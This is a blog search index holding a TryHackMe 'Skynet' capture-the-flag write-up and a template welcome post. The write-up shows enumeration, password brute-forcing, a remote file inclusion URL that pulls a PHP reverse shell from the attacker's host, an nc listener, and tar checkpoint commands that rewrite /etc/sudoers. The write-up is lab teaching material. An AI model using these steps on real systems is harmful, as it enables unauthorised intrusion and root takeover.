[{"content":"Link to the machine\nAnswer 1 My target IP : 10.10.84.89\nWe start by simply launching an nmap scan.\n1 nmap -sC -sV -oN nmap -O -T4 [@Target_IP] We can see that 6 services are open, including port 80. We navigate to a web browser to see what it is.\nWe launch gobuster to discover hidden files or directories.\nThe \u0026ldquo;admin\u0026rdquo; directory is forbidden, so we focus on the \u0026ldquo;squirrelmail\u0026rdquo; directory.\nWe could attempt a brute force attack, but for now, I prefer to revisit the information provided by nmap, which indicates the presence of a Samba share. To exploit it, we can use the tool \u0026ldquo;enum4linux.\u0026rdquo;\n1 enum4linux 10.10.84.89 Bingo! We learn two things: anonymous account usage is allowed, and there is also a share named \u0026ldquo;milesdyson.\u0026rdquo;\nLet\u0026rsquo;s connect anonymously and download the content of the \u0026ldquo;milesdyson\u0026rdquo; share.\nWe find that \u0026ldquo;log1.txt\u0026rdquo; is a password list.\nAt this stage, we have a list of passwords and a possible username: milesdyson. We try to connect to the mail server using the passwords from this list and the username milesdyson. Success! It was quite fast.\nAnswer 2 In one of the emails, we find the new password for this user, allowing us to connect to their share.\nIn the \u0026ldquo;notes\u0026rdquo; directory, we find the file \u0026ldquo;important.txt.\u0026rdquo;\nThe document mentions a CMS. Let\u0026rsquo;s see how it looks in the browser.\nHere is our hidden directory.\nAnswer 3 Not knowing what to do at this stage, I relaunch gobuster on this new address.\nWe get something called Cuppa CMS. Let\u0026rsquo;s search if there is a known vulnerability.\nRemote File Inclusion, let\u0026rsquo;s try to inject a reverse shell.\nAnswer 4 I\u0026rsquo;ll use the one from pentestmonkey.\nMy target IP : 10.10.220.244\nRemember to modify the address in the script with your own machine\u0026rsquo;s :\nIn one terminal, we start the Python server where our script is located.\nIn another terminal, we listen on port 1234 (if you haven\u0026rsquo;t changed it):\n1 nc -lvnp 1234 So in a shell :\nAnd in another :\nThen, in the web browser:\n1 http://10.10.84.89/[NAME OF HIDDEN DIRECTORY]/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.220.244:8000/php-reverse-shell.php The reverse shell is in place!\nAnswer 5 Now it\u0026rsquo;s time to escalate privileges.\nI can\u0026rsquo;t use the \u0026ldquo;sudo -l\u0026rdquo; command, so I decide to take a look at the crontab, and there we find an interesting file.\nI\u0026rsquo;ll check GTFOBins to see if we can do something with that \u0026ldquo;tar\u0026rdquo; command executed as root.\n1 2 3 echo \u0026#39;echo \u0026#34;www-data ALL=(root) NOPASSWD: ALL\u0026#34; \u0026gt; /etc/sudoers\u0026#39; \u0026gt; privesc.sh echo \u0026#34;/var/www/html\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=sh privesc.sh\u0026#34; echo \u0026#34;/var/www/html\u0026#34; \u0026gt; --checkpoint=1 After 1 minute :\n","date":"2023-05-18T00:00:00Z","image":"https://hekethys.github.io/web/p/tryhackme/assets/skynet_hu43942a92840528ce8839e4cdc5462543_70965_120x120_fill_q75_box_smart1.jpeg","permalink":"https://hekethys.github.io/web/p/tryhackme/","title":"Skynet"},{"content":"Welcome to Hugo theme Stack. This is your first post. Edit or delete it, then start writing!\nFor more information about this theme, check the documentation: https://docs.stack.jimmycai.com/\nWant a site like this? Check out hugo-theme-stack-stater\nPhoto by Pawel Czerwinski on Unsplash\n","date":"2022-03-06T00:00:00Z","image":"https://hekethys.github.io/web/p/hello-world/cover_hud7e36f7e20e71be184458283bdae4646_55974_120x120_fill_q75_box_smart1.jpg","permalink":"https://hekethys.github.io/web/p/hello-world/","title":"Hello World"}]